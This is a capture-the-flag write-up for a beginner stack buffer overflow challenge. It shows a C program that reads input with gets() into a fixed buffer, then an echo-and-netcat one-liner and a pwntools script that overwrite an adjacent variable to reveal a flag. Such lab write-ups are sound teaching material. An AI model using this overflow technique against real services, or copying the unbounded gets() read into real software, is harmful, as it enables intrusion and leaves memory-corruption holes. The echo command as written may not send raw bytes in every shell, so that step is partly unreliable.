# Overwrite Me 2
We are given a similar source as in the first overwrite challenge only this time
the secret needs to be a non ASCII value. This means that we can't just input 
our payload like last time, instead we have to somehow send the raw bytes to the
binary.

```C
#include <stdio.h>

int main() {
    int secret = 0xdeadbeef;
    char your_secret[32];
    printf("Tell me your secret: ");
    gets(your_secret);
    if (secret == 0xbeefdead) {
        puts("Wow! Guess I was wrong: falg{notyurfalg}");
    } else {
        printf("Yay more secrets! Now they are shared on Twitter and Mastodon.\n");
    }
}
```

The simplest way of sending raw bytes to the binary is by using `echo` and piping
over netcat (`nc`), like so:

```
echo '\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe' | nc IP_ADDRESS PORT
Tell me your secret: Wow! gg{becoming_1337_hax0r_takes_time_and_now_youve_started_the_journey}
```

However this quickly becomes tiresome for more complext challenges so it is 
always a good idea to use `pwntools` instead:

```python
from pwn import *

sh = remote('IP_ADDRESS', PORT)
payload = b"A" * 44
payload += p32(0xBEEFDEAD)
sh.recvuntil(b": ")
sh.sendline(payload)
flag = sh.recvline().decode()
print(flag)
```
